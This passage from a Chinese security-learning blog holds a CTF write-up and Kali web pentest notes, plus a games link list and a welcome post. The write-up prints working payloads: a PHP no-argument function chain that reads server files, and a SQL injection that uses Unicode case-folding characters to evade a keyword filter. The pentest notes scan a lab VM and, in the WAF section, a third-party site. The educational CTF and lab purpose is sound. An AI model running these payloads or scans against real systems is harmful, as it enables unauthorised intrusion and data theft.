class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ps:他们说这题最早出现是在RCTF2018中<br><a href="https://lorexxar.cn/2018/05/23/rctf2018/" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/</a><br>在原来的题目中是用next(getallheaders())绕过这个限制的。但这里 <code>getallheaders</code> 是 apache 中的函数，这里是 nginx 环境。<br><del>先挖个坑，再慢慢看。</del></p><h3 id="4-1-正则-R-介绍"><a href="#4-1-正则-R-介绍" class="headerlink" title="4.1 正则 (?R) 介绍"></a>4.1 正则 (?R) 介绍</h3><p>第一次看到这样的正则式的时候，有点懵逼。还是需要调试理解：<br><img src="./4-1.png" alt></p><p>可以知道，<code>(?R)</code><strong>可以递归整个模式</strong><br>具体到这个问题，<code>preg_replace</code> 返回替换后的字符串；<br><code>$_GET[&#39;code&#39;]</code> 的值为一个函数，但是不能带任何参数；<br>函数的括号里面又可以是一个函数： <code>dirname(getcwd())</code></p><h3 id="4-2-技巧一：使用-get-defined-vars-函数"><a href="#4-2-技巧一：使用-get-defined-vars-函数" class="headerlink" title="4.2 技巧一：使用 get_defined_vars 函数"></a>4.2 技巧一：使用 <code>get_defined_vars</code> 函数</h3><blockquote><p>get_defined_vars — 返回由所有已定义变量所组成的数组 </p></blockquote><p>包括全局变量GET等.</p><h4 id="4-2-1-利用重点：-直接reset所有的变量"><a href="#4-2-1-利用重点：-直接reset所有的变量" class="headerlink" title="4.2.1 利用重点： 直接reset所有的变量"></a>4.2.1 利用重点： 直接reset所有的变量</h4><ul><li>调试过程可以借助 <code>print_r()</code> 函数查看输出结果；<br>  <img src="./4-2.png" alt></li><li>reset 所有变量<br>  <img src="./4-3.png" alt></li><li>在新的数组里加入一个新变量 <code>1</code><br>  <img src="./4-4.png" alt></li><li><code>implode()</code> 函数将它们连接成一个字符串。注意，<strong>第一个变量后的东西全部注释掉</strong><br>  <img src="./4-5.png" alt></li><li><code>eval</code> 函数执行这个字符串<br>  <img src="./4-6.png" alt></li><li>接下来，只要控制 1 这个变量的值就可以了<br>  <img src="./4-7.png" alt></li></ul><h3 id="4-2-直接列目录"><a href="#4-2-直接列目录" class="headerlink" title="4.2 直接列目录"></a>4.2 直接列目录</h3><blockquote><p>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</p></blockquote><h2 id="五-easy-nodechr"><a href="#五-easy-nodechr" class="headerlink" title="五. easy - nodechr"></a>五. easy - nodechr</h2><p>后台是 <code>nodejs</code> 写的，再感受下 <code>Unicode</code> 编码和 <code>JS</code> 的黑魔法。<br>关键代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-Unicode编码（或者urldecode）经过upper-和lower"><a href="#5-1-Unicode编码（或者urldecode）经过upper-和lower" class="headerlink" title="5.1 Unicode编码（或者urldecode）经过upper()和lower()"></a>5.1 Unicode编码（或者urldecode）经过upper()和lower()</h3><p><strong>python3和JavaScript都有这个特性。</strong></p><blockquote><p>toUpperCase()是javascript中将小写转换成大写的函数。<br>toLowerCase()是javascript中将大写转换成小写的函数。</p></blockquote><p>一般我们认为就是将 ASCII码 在127以内的字母进行大小写转换。但是换成其他Unicode编码呢。</p><blockquote><p>“ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。<br>“K”.toLowerCase() == ‘k’。<br>通过这个小特性可以绕过一些限制。</p></blockquote><p><strong>同样利用这个特性，也能绕过一些XSS。</strong></p><p><strong>引用一句话：</strong></p><blockquote><p>这里的特殊部分是转换行为。并非所有Unicode字符在转换为大写字母时都具有匹配的表示形式 - <strong>因此浏览器通常倾向于采用外观相似，最适合的映射ASCII字符。</strong> 这种行为有相当大范围的字符，所有浏览器的做法都有所不同。</p></blockquote><p>相关演示：</p><ul><li><p>JS：<br>  <img src="./5-1.png" alt></p></li><li><p>python3：<br>  <img src="./5-2.png" alt></p></li><li>汇总：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">K ---- k</span><br><span class="line">ß(223) ---- SS</span><br><span class="line">ı(305) ---- I</span><br><span class="line">ſ(383) ---- S</span><br><span class="line">ﬀ(64256) ---- FF</span><br><span class="line">ﬁ(64257) ---- FI</span><br><span class="line">ﬂ(64258) ---- FL</span><br><span class="line">ﬃ(64259) ---- FFI</span><br><span class="line">ﬄ(64260) ---- FFL</span><br><span class="line">ﬅ(64261) ---- ST</span><br><span class="line">ﬆ(64262) ---- ST</span><br></pre></td></tr></table></figure></li></ul><p>括号里的数是十进制数，转成Unicode编码需要先转成十六进制。<br><img src="./5-3.png" alt></p><h3 id="5-2-解题时被burpsuite坑了"><a href="#5-2-解题时被burpsuite坑了" class="headerlink" title="5.2 解题时被burpsuite坑了"></a>5.2 解题时被burpsuite坑了</h3><p>后台使用nodejs写的，但是对nodejs没有很熟悉，后台代码也只能看出个大概。一度认为没有回显，只能盲注。但真实的是登录上去后就会显示从数据库中取出的用户名。所以可以<strong>联合查询</strong>，将flag回显。</p><p>在burpsuite的repeater模块中，构造好payload，发送过去，跳转到登录页面（错误情况下会显示错误，不会跳转），但并没有显示任何有用信息。</p><p>当burpsuite抓到包后，直接构造好username和password，再发送，浏览器会显示flag。</p><blockquote><p>payload: username=aaa&amp;password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),’3</p></blockquote><p><strong>特别注意！！！：</strong><br>在浏览器中输入 <code>ı</code> 这个时，抓包在 burpsuite 中显示的 url编码 是 <code>%C4%B1</code>。但这个符号的 Unicode编码 是 <code>\u0131</code> 。<strong>发送过去还是以url编码为主。</strong></p><h3 id="5-3-利用python3进行Unicode编码和url编码转换"><a href="#5-3-利用python3进行Unicode编码和url编码转换" class="headerlink" title="5.3 利用python3进行Unicode编码和url编码转换"></a>5.3 利用python3进行Unicode编码和url编码转换</h3><p>python3的url编码<strong>在 <code>urllib.parse</code> 这个包中</strong>，而不在 <code>urllib</code> 这个包中。</p><p><img src="./5-4.png" alt></p><hr><p><img src="./5-5.png" alt></p><p>Unicode编码 -&gt; url编码：<br><img src="./5-6.png" alt></p><p><strong>记住：发送字符或者用burpsuite发送，不要写 <code>\u0131</code> ，要用url编码 <code>%C4%B1</code>。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code-Breaking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H5+CSS+JS__game</title>
      <link href="/passages/H5-CSS-JS-game/"/>
      <url>/passages/H5-CSS-JS-game/</url>
      
        <content type="html"><![CDATA[<blockquote><p>JS这门语言，很难。<br>其一：自己能力不足<br>其二：它深不见底</p></blockquote><a id="more"></a><blockquote><p>flash?仔细看标题！</p></blockquote><h2 id="air-flower"><a href="#air-flower" class="headerlink" title="air-flower"></a><a href="/mysource/air-flower">air-flower</a></h2><h2 id="bouncing"><a href="#bouncing" class="headerlink" title="bouncing"></a><a href="/mysource/bouncing">bouncing</a></h2><h2 id="drive-a-race"><a href="#drive-a-race" class="headerlink" title="drive-a-race"></a><a href="/mysource/drive-a-race">drive-a-race</a></h2><h2 id="fast-animations"><a href="#fast-animations" class="headerlink" title="fast-animations"></a><a href="/mysource/fast-animations">fast-animations</a></h2><h2 id="geometric"><a href="#geometric" class="headerlink" title="geometric"></a><a href="/mysource/geometric">geometric</a></h2><h2 id="help-me-down"><a href="#help-me-down" class="headerlink" title="help-me-down"></a><a href="/mysource/help-me-down">help-me-down</a></h2><h2 id="help-me-down-iii"><a href="#help-me-down-iii" class="headerlink" title="help-me-down-iii"></a><a href="/mysource/help-me-down-iii">help-me-down-iii</a></h2><h2 id="loading-3"><a href="#loading-3" class="headerlink" title="loading-3"></a><a href="/mysource/loading-3">loading-3</a></h2><h2 id="loading-animation-2"><a href="#loading-animation-2" class="headerlink" title="loading-animation-2"></a><a href="/mysource/loading-animation-2">loading-animation-2</a></h2><h2 id="mouse-follower"><a href="#mouse-follower" class="headerlink" title="mouse-follower"></a><a href="/mysource/mouse-follower">mouse-follower</a></h2><h2 id="optical-illusion"><a href="#optical-illusion" class="headerlink" title="optical-illusion"></a><a href="/mysource/optical-illusion">optical-illusion</a></h2><h2 id="physical-animations-with-lists"><a href="#physical-animations-with-lists" class="headerlink" title="physical-animations-with-lists"></a><a href="/mysource/physical-animations-with-lists">physical-animations-with-lists</a></h2><h2 id="simple-clock"><a href="#simple-clock" class="headerlink" title="simple-clock"></a><a href="/mysource/simple-clock">simple-clock</a></h2><h2 id="solarsystem"><a href="#solarsystem" class="headerlink" title="solarsystem"></a><a href="/mysource/solarsystem">solarsystem</a></h2><h2 id="tanks"><a href="#tanks" class="headerlink" title="tanks"></a><a href="/mysource/tanks">tanks</a></h2><h2 id="timeline-visualized"><a href="#timeline-visualized" class="headerlink" title="timeline-visualized"></a><a href="/mysource/timeline-visualized">timeline-visualized</a></h2><h2 id="twinkle-twinkle-little-star"><a href="#twinkle-twinkle-little-star" class="headerlink" title="twinkle-twinkle-little-star"></a><a href="/mysource/twinkle-twinkle-little-star">twinkle-twinkle-little-star</a></h2><h2 id="water-rings"><a href="#water-rings" class="headerlink" title="water-rings"></a><a href="/mysource/water-rings">water-rings</a></h2>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali_web_test</title>
      <link href="/passages/kali-test/"/>
      <url>/passages/kali-test/</url>
      
        <content type="html"><![CDATA[<p>2019年，占个位置慢慢写</p><blockquote><p>未完待续。。。</p></blockquote><h2 id="一-配置"><a href="#一-配置" class="headerlink" title="一 配置"></a>一 配置</h2><h3 id="1-1-kali主机IP：192-168-91-128"><a href="#1-1-kali主机IP：192-168-91-128" class="headerlink" title="1.1 kali主机IP：192.168.91.128"></a>1.1 kali主机IP：192.168.91.128</h3><p><img src="./kaili_ip.png" alt></p><h3 id="1-2-漏洞服务器IP：192-168-91-130"><a href="#1-2-漏洞服务器IP：192-168-91-130" class="headerlink" title="1.2 漏洞服务器IP：192.168.91.130"></a>1.2 漏洞服务器IP：192.168.91.130</h3><p><img src="./owasp_ip.png" alt></p><p>ping一下：<br><img src="./ping.png" alt></p><p>浏览器访问：<br><img src="./靶机搭建成功.png" alt></p><p><strong>大功告成</strong></p><h2 id="二-侦察"><a href="#二-侦察" class="headerlink" title="二. 侦察"></a>二. 侦察</h2><p>在每个渗透测试中，无论对于网络还是Web应用，都有一套流程。其中需要完成一些步骤，来增加我们发现和利用每个影响我们目标的可能的漏洞的机会。例如：</p><blockquote><ul><li>侦察</li><li>枚举</li><li>利用</li><li>维持访问</li><li>清理踪迹</li></ul></blockquote><p>侦查是一个层面，其中测试者必须识别网络、防火墙和入侵检测系统中所有可能组件。它们也会收集关于公司、网络和雇员的最大信息。在我们的例子中，对于Web应用渗透测试，这个阶段主要关于了解应用、数据库、用户、服务器以及应用和我们之间的关系。</p><p>侦查是每个渗透测试中的必要阶段。我们得到了的目标信息越多，发现和利用漏洞时，我们拥有的选项就越多。</p><hr><h3 id="2-1-Nmap使用"><a href="#2-1-Nmap使用" class="headerlink" title="2.1 Nmap使用"></a>2.1 Nmap使用</h3><p>Nmap 可能是世界上最广泛使用的端口扫描器。他可以用于识别活动主机、扫描 TCP和UDP 开放端口，检测防火墙，获得运行在远程主机上的服务版本，甚至是，可以使用脚本来发现和利用漏洞。</p><h4 id="2-1-1-操作步骤"><a href="#2-1-1-操作步骤" class="headerlink" title="2.1.1 操作步骤"></a>2.1.1 操作步骤</h4><ul><li><strong>查看服务器是否响应</strong></li></ul><blockquote><p><strong>nmap -sn 192.168.91.130</strong></p></blockquote><p><img src="./nmap1.png" alt></p><ul><li><strong>查看打开的端口</strong></li></ul><blockquote><p><strong>nmap 192.168.91.130</strong></p></blockquote><p><img src="./nmap2.png" alt></p><ul><li><strong>让 Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统</strong></li></ul><blockquote><p><strong>map -sV -O 192.168.91.130</strong></p></blockquote><p><img src="./nmap3.png" alt></p><p><strong>可以看到漏洞服务器使用Apache2.2.14的Web服务器；PHP使用的版本是5.3.2；使用的是Linux2.6的内核。</strong></p><h4 id="2-1-2-工作原理"><a href="#2-1-2-工作原理" class="headerlink" title="2.1.2 工作原理"></a>2.1.2 工作原理</h4><p>Nmap 是个端口扫描器，这意味着它可以向一些指定IP的TCP或UDP端口发送<strong>封包</strong>，并<strong>检查是否有响应</strong>。如果有的话，这意味着端口是打开的，因此，端口上运行着服务。</p><p>在第一个名中，使用-sn参数，我们让Nmap只检查是否服务器响应ICMP请求（或ping）。我们的服务器响应了，所以它是活动的。</p><p>第二个命令是调用 Nmap的最简方式，它只指定目标IP。所做的事情是先ping服务器，如果它响应了，Nmap 会向1000个TCP端口列表发送<strong>探针</strong>，来观察哪个端口响应，之后报告响应端口的结果。</p><p>第三个命令向第二个添加了如下两个任务：</p><blockquote><ul><li>-sV 请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。</li><li>-O 告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。</li></ul></blockquote><h4 id="2-1-3-其他参数"><a href="#2-1-3-其他参数" class="headerlink" title="2.1.3 其他参数"></a>2.1.3 其他参数</h4><ul><li><p><code>-sT</code>：通常，在 root用户下运行Nmap时，它使用SYN扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。</p></li><li><p><code>-Pn</code>：如果我们已经知道了主机是活动的或者不响应ping，我们可以使用这个参数告诉Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。</p></li><li><p><code>-v</code>：这会开启详细模式。Nmap会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。</p></li><li><p><code>-p N1,N2...Nn</code>：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口21，80到90，和137，参数应为：-p 21,80-90,137。</p></li><li><p><code>--script=script_name</code>：Nmap包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉Nmap在目标的开放端口上运行脚本。你可能打算查看一些 Nmap 脚本，它们在：<a href="https://nmap.org/nsedoc/scripts/。" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/。</a></p></li></ul><h3 id="2-2-识别-Web-应用防火墙"><a href="#2-2-识别-Web-应用防火墙" class="headerlink" title="2.2 识别 Web 应用防火墙"></a>2.2 识别 Web 应用防火墙</h3><p>Web 应用防火墙（WAF）是一个<code>设备或软件</code>，它可以检查发送到Web服务器的封包，以便识别和阻止可能的恶意封包，它们通常基于<strong>签名</strong>或<strong>正则表达式</strong>。</p><p>如果未检测到的 WAF 阻止了我们的请求或者封禁了我们的IP，我们渗透测试中就要处理很多的麻烦。在执行渗透测试的时候，侦查层面必须包含检测和是否被WAF，入侵检测系统（IDS），或者入侵阻止系统（IPS）。这是必须的，为了采取必要的手段来防止被阻拦或禁止。</p><h4 id="2-2-1-操作步骤"><a href="#2-2-1-操作步骤" class="headerlink" title="2.2.1 操作步骤"></a>2.2.1 操作步骤</h4><ol><li><p>Nmap 包含了一些<strong>脚本</strong>，用于测试 WAF 的存在。在漏洞服务器上尝试它们：</p><blockquote><p>nmap -p 80,443 –script=http-waf-detect 192.168.56.102</p></blockquote><p> <img src="./nmap-waf-1.png" alt><br> 没检测到任何 WAF，漏洞服务器上没有任何WAF。</p></li><li><p>在真正拥有防火墙的服务器上尝试相同命令，使用<code>www.baidu.com</code>.</p><blockquote><p>nmap -p 80,443 –script=http-waf-detect <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p> <img src="./nmap-waf-2.png" alt><br> 可以看到，80和443端口都配备有WAF。</p></li><li><p>另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确。</p><blockquote><p>nmap -p 80,443 –script=http-waf-fingerprint <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote></li><li><p>另一个 Kali Linux 自带的工具可以帮助我们检测和是被 WAF，它叫做<code>waf00f</code>。</p><blockquote><p>waf00f <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p> <img src="./nmap-waf-3.png" alt></p></li></ol><h4 id="2-2-2-工作原理"><a href="#2-2-2-工作原理" class="headerlink" title="2.2.2 工作原理"></a>2.2.2 工作原理</h4><p>WAF 检测的原理是通过<strong>发送特定请求</strong>到服务器，之后<strong>分析响应</strong>。例如，在http-waf-detect的例子中，它发送了一些基本的恶意封包，并对比响应，同时查找封包被阻拦、拒绝或检测到的标识。http-waf-fingerprint也一样，但是这个脚本也尝试拦截响应，并根据已知的不同 IDS 和 WAF 的模式对其分类。wafw00f也是这样。</p><h3 id="2-3-获取和修改-Cookie"><a href="#2-3-获取和修改-Cookie" class="headerlink" title="2.3 获取和修改 Cookie"></a>2.3 获取和修改 Cookie</h3><p>Cookie 是由服务器发送给浏览器（客户端）的小型信息片段，用于在本地储存一些信息，它们和特定用户相关。在现代Web应用中，Cookie用于储存用户特定的数据、例如主题颜色配置、对象排列偏好、上一个活动、以及（对我们更重要）会话标识符。</p><h4 id="2-3-1-实验操作"><a href="#2-3-1-实验操作" class="headerlink" title="2.3.1 实验操作"></a>2.3.1 实验操作</h4><ol><li><p>启动 Mantra ，在终端输入即可启动</p><blockquote><p>owasp-mantra-ff</p></blockquote></li><li><p>从 Mantra 的菜单栏访问Tools | Application Auditing | Cookies Manager +<br> 浏览<a href="http://192.168.91.130/WackoPicko/" target="_blank" rel="noopener">http://192.168.91.130/WackoPicko/</a><br> <img src="./cookie-1.png" alt><br> 在这个截图中，我们可以从这个插件中看到所有该时刻储存的Cookie，以及所有它们所属的站点。我们也可以修改它们的值，删除它们以及添加新的条目。</p></li></ol><h4 id="2-3-2-工作原理"><a href="#2-3-2-工作原理" class="headerlink" title="2.3.2 工作原理"></a>2.3.2 工作原理</h4><p><code>Cookies Manager+</code> 是个浏览器插件，允许我们<strong>查看</strong>、<strong>修改</strong>或<strong>删除</strong>现有的Cookie，以及<strong>添加新的条目</strong>。因为一些应用依赖于储存在这些Cookie中的值，<strong>攻击者可以使用它们来输入恶意的模式</strong>，可能会修改页面行为，或者<strong>提供伪造信息用于获取高阶权限</strong>。</p><p>同时，在现代 Web 应用中，会话Cookie通常被使用，通常是登录完成之后的用户标识符的唯一兰苑。这会导致潜在的有效用户冒充，通过将Cookie值替换为某个活动会话的用户。</p><h3 id="2-4-使用-DirBuster-发现文件和文件夹"><a href="#2-4-使用-DirBuster-发现文件和文件夹" class="headerlink" title="2.4 使用 DirBuster 发现文件和文件夹"></a>2.4 使用 DirBuster 发现文件和文件夹</h3><p><code>DirBuster</code> 是个工具，用于通过爆破来发现Web服务器中的现存文件和目录。<br>DirBuster在 kali 下自带字典的路径为</p><blockquote><p>/usr/share/dirbuster/wordlists/</p></blockquote><p><img src="./dirbster-dic.png" alt></p><h4 id="2-4-1-实验操作"><a href="#2-4-1-实验操作" class="headerlink" title="2.4.1 实验操作"></a>2.4.1 实验操作</h4><p><img src="./dirbster-use.png" alt><br>如上图，<br>线程一般设置20；字典文件选择自带的即可；递归选项有时可以去点。</p><h4 id="2-4-2-工作原理"><a href="#2-4-2-工作原理" class="headerlink" title="2.4.2 工作原理"></a>2.4.2 工作原理</h4><p>DirBuster 是个爬虫和爆破器的组合，<strong>它允许页面上的所有连接</strong>，<strong>同时尝试可能文件的不同名称</strong>。这些名称可以保存在文件中，类似于我们所使用的那个，或者可以由DirBuster 通过“纯粹暴力破解”选项，并为生成单词设置字符集和最小最大长度来自动生成。</p><p>为了判断文件是否存在，DirBuster使用服务器生成的响应代码。最常见的响应在下面列出：</p><ul><li><p><code>200 OK</code>：文件存在并能够读取。</p></li><li><p><code>301 Moved permanently</code>：这是到给定 URL 的重定向。</p></li><li><p><code>401 Unauthorized</code>：需要权限来访问这个文件。</p></li><li><p><code>403 Forbidden</code>：请求有效但是服务器拒绝响应。</p></li><li><p><code>404 File not found</code>：文件不存在。</p></li></ul><h3 id="2-5-使用-Cewl-分析密码"><a href="#2-5-使用-Cewl-分析密码" class="headerlink" title="2.5 使用 Cewl 分析密码"></a>2.5 使用 Cewl 分析密码</h3><p>cewl 通过<strong>爬行网站</strong>获取关键信息<strong>创建一个密码字典</strong></p><p><strong>使用 CeWL 来获取应用所使用的单词列表</strong>。并保存它用于之后的登录页面暴力破解。</p><h4 id="2-5-1-操作步骤"><a href="#2-5-1-操作步骤" class="headerlink" title="2.5.1 操作步骤"></a>2.5.1 操作步骤</h4><ol><li><p>首先查看一下 cewl 的帮助文档，了解相关的选项<br> <img src="./cewl-h.png" alt></p></li><li><p>使用 cewl 来获得漏洞服务器中 <code>WackoPicko应用</code> 中的单词。长度最小为5 的单词，显示单词数量，将结果保存到cewl_WackoPicko.txt<br> <code>cewl -w cewl_WackoPicko.txt -c -m 5 http://192.168.91.130/WackoPicko/</code><br> <img src="./cewl-2.png" alt></p></li><li><p>查看结果<br> <img src="./cewl-3.png" alt><br> 这个列表仍然需要一些过滤来去掉数量多但是不可能用于密码的单词，例如“Services”，“Content”或者“information”。</p></li></ol><h4 id="2-5-2-工作原理"><a href="#2-5-2-工作原理" class="headerlink" title="2.5.2 工作原理"></a>2.5.2 工作原理</h4><p>CeWL 是个 Kali 中的工具，<strong>爬取网站并提取独立单词的列表</strong>。它也可以提供每个单词的重复次数，保存结果到文件，使用页面的元数据以及其它。</p><h4 id="2-5-3-其他相关工具"><a href="#2-5-3-其他相关工具" class="headerlink" title="2.5.3 其他相关工具"></a>2.5.3 其他相关工具</h4><p>其它工具也可用于类似目的，它们中的一些生成<strong>基于规则或其它单词列表</strong>的单词列表，另一些可以<strong>爬取网站来寻找最常用的单词</strong>。</p><ul><li>Crunch：这是<strong>基于由用户提供的字符集合</strong>的生成器。它使用这个集合来生成所有可能的组合。Crunch 包含在 Kali 中。</li><li>Wordlist Maker (WLM)：WLM 能够<strong>基于字符集</strong>来生成单词列表，也能够<strong>从文本文件和网页中提取单词</strong>（<a href="http://www.pentestplus.co.uk/wlm.htm）。" target="_blank" rel="noopener">http://www.pentestplus.co.uk/wlm.htm）。</a></li><li>Common User Password Profiler (CUPP)：这个工具可以<strong>使用单词列表</strong>来为常见的用户名分析可能的密码，以及<strong>从数据库下载单词列表和默认密码</strong>（<a href="https://github.com/Mebus/cupp）。" target="_blank" rel="noopener">https://github.com/Mebus/cupp）。</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome！</title>
      <link href="/passages/welcome/"/>
      <url>/passages/welcome/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://www.fenghlz.xyz/">FengHLZ’blog</a></p><blockquote><p>新的，好看的博客。<br>旧博客。。就放那吧。。<br>从今天起，好好学习。</p></blockquote><p><img src="./1538583359355.jpg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xyz</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
